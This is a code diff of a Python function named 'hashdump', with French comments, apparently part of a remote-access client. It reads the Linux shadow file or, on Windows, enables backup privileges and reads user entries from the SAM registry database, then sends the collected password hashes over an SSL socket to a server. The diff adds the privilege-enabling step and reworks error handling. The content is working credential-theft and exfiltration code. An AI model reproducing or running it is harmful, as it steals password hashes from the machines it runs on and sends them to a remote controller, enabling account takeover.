@@ -129,9 +129,19 @@ def hashdump(ssl_socket):
             hashdump_to_send = fichier_shadow.read()  # Lecture du contenu du fichier shadow
     elif os_type == "nt":  # Test si la machine est une Windows
         try:
+            # Tentative d'obtention des privilèges administratifs
+            win32security.AdjustTokenPrivileges(
+                win32security.OpenProcessToken(
+                    win32api.GetCurrentProcess(),
+                    win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
+                ),
+                False,
+                [(win32security.LookupPrivilegeValue(None, win32security.SE_BACKUP_NAME), win32security.SE_PRIVILEGE_ENABLED)]
+            )
+
             reg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
             sam = OpenKey(reg, r"SAM\SAM\Domains\Account\Users")
-            
+
             hashdump_to_send = ""
             for i in range(0, win32api.RegQueryInfoKey(sam)[0]):
                 try:
@@ -142,10 +152,12 @@ def hashdump(ssl_socket):
                 except Exception as e:
                     hashdump_to_send += f"Erreur pour {key_name}: {str(e)}\n"
         except Exception as e:
-            ssl_socket.send(f"Erreur lors de l'accès à la base SAM: {str(e)}".encode())
+            hashdump_to_send = f"Erreur lors de l'accès à la base SAM: {str(e)}"
     else:
-        hashdump_to_send = "OS non reconnu" # Gestion d'erreur
+        hashdump_to_send = "OS non reconnu"  # Gestion d'erreur
+
     ssl_socket.send(hashdump_to_send.encode())  # Envoie du fichier hashdump au serveur
+
 
 
 def main():
